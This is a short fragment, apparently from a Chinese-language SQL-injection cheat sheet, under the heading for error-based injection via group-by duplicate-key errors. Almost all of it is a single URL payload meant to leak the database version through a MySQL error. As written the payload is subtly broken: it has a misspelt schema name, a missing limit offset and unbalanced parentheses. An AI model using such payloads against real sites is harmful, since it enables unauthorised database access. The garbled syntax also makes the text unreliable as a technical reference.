...
## ***三、报错注入***
#### 1、group by 重复键冲突
	?id=1 and (select 1 from (select count(*),concat(select version() from information_schema.tables limit ,1),floor(rand()*2))x from informatiom_schema.tables group by x)a) --+
